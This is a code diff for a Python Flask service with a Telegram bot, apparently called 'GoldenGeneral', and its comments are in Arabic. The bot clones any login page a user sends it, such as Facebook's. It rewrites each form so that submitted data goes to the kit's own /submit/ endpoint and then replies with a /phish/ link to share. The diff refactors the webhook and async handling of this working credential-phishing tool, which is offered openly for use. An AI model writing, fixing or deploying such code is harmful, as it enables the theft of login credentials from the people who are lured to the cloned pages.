@@ -1,4 +1,4 @@
-import os, re, uuid, logging, tempfile
+import os, re, uuid, logging, tempfile, asyncio
 import requests
 from bs4 import BeautifulSoup
 from flask import Flask, request, abort, redirect
@@ -19,6 +19,33 @@ WEBHOOK_URL = f"{RENDER_URL}{WEBHOOK_PATH}"
 app = Flask(__name__)
 phish_pages = {}
 
+# ---- بوت تيليجرام (تعريف خارجي) ----
+app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🥇 أرسل رابط أي صفحة تسجيل دخول لاستنساخها فورًا.\nمثال: https://facebook.com/login")
+
+async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    url = update.message.text.strip()
+    if not url.startswith("http"):
+        url = "https://" + url
+    msg = await update.message.reply_text("🔧 جاري استنساخ الموقع...")
+    try:
+        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        page_id = str(uuid.uuid4())[:8]
+        for form in soup.find_all('form'):
+            form['action'] = f"/submit/{page_id}"
+        modified_html = str(soup)
+        phish_pages[page_id] = (modified_html, url, 'generic')
+        await msg.edit_text(f"🎣 تم الاستنساخ: {RENDER_URL}/phish/{page_id}")
+    except Exception as e:
+        await msg.edit_text(f"❌ فشل: {e}")
+
+app_bot.add_handler(CommandHandler("start", start))
+app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
+
+# ---- مسارات Flask ----
 @app.route('/phish/<page_id>')
 def serve_phish(page_id):
     page = phish_pages.get(page_id)
@@ -42,55 +69,18 @@ def submit_phish(page_id):
 def health():
     return "GoldenGeneral is live"
 
-# ========== بوت تيليجرام (Webhook) ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🥇 أرسل رابط أي صفحة تسجيل دخول لاستنساخها فورًا.\nمثال: https://facebook.com/login")
+# ---- استقبال تحديثات تيليجرام ----
+@app.route(WEBHOOK_PATH, methods=['POST'])
+def webhook():
+    update = Update.de_json(request.get_json(force=True), app_bot.bot)
+    asyncio.run(app_bot.process_update(update))
+    return "OK"
 
-async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    url = update.message.text.strip()
-    if not url.startswith("http"):
-        url = "https://" + url
-    msg = await update.message.reply_text("🔧 جاري استنساخ الموقع...")
-    try:
-        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
-        soup = BeautifulSoup(resp.text, 'html.parser')
-        page_id = str(uuid.uuid4())[:8]
-        for form in soup.find_all('form'):
-            form['action'] = f"/submit/{page_id}"
-        modified_html = str(soup)
-        phish_pages[page_id] = (modified_html, url, 'generic')
-        await msg.edit_text(f"🎣 تم الاستنساخ: {RENDER_URL}/phish/{page_id}")
-    except Exception as e:
-        await msg.edit_text(f"❌ فشل: {e}")
-
-def setup_bot():
-    """تجهيز البوت وربطه بـ Webhook"""
-    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
-    app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
-
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.INFO)
+    # تهيئة البوت مرة واحدة
+    asyncio.run(app_bot.initialize())
     # تعيين webhook
     requests.post(f"{TELEGRAM_URL}/setWebhook", json={"url": WEBHOOK_URL})
     logging.info(f"Webhook set to {WEBHOOK_URL}")
-
-    # استقبال التحديثات من تيليجرام عبر endpoint
-    @app.route(WEBHOOK_PATH, methods=['POST'])
-    def webhook():
-        update = Update.de_json(request.get_json(force=True), app_bot.bot)
-        app_bot.update_queue.put(update)
-        return "OK"
-
-    # تشغيل معالجة التحديثات بشكل غير متزامن داخل Flask
-    @app.before_first_request
-    async def start_updater():
-        await app_bot.initialize()
-        await app_bot.start()
-        # تشغيل عملية استهلاك التحديثات
-        async def consume():
-            async for update in app_bot.update_queue:
-                await app_bot.process_update(update)
-        app_bot.create_task(consume())
-
-if __name__ == '__main__':
-    setup_bot()
     app.run(host='0.0.0.0', port=PORT)
